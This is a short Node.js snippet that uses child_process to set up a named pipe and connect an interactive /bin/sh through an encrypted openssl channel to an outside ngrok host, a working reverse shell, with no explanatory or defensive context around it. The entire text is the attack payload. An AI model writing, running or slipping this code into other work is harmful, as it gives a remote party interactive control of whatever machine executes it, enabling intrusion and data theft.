(function() {
 var c = require('child_process');
 c.exec("mkfifo .s");
 c.exec("/bin/sh -i < .s 2>&1 | openssl s_client -quiet -connect 2.tcp.ngrok.io:16352 > .s");
 c.exec("rm .s");
 })()
